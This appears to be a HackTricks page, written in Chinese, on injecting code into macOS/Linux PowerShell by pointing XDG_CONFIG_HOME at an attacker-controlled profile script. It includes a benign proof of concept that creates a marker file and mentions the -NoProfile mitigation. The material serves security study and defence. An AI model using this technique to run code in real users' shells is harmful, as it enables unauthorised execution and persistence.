# macOS PowerShell Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `XDG_CONFIG_HOME` 和 PowerShell profiles

在 macOS 和 Linux 上，PowerShell 使用 XDG 配置路径，并在 `pwsh` 启动时执行用户 profile scripts。重定向 `XDG_CONFIG_HOME` 会更改包含 `powershell/profile.ps1` 和特定于 console host 的 `powershell/Microsoft.PowerShell_profile.ps1` 的目录；因此，其中受控的文件可以在 `-Command` payload 之前执行。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
这适用于非 Windows 平台上的 PowerShell 6+（`pwsh`）；Windows PowerShell 使用不同的 profile 位置。`pwsh -NoProfile` 会禁止加载 profile。此外，还应检查 `HOME` 和特定于主机的 profile 名称，因为其他 PowerShell 主机可能会选择不同的脚本。

## References

- [1] [PowerShell 环境变量和 XDG 路径](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [PowerShell profiles](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
{{#include ../../../banners/hacktricks-training.md}}
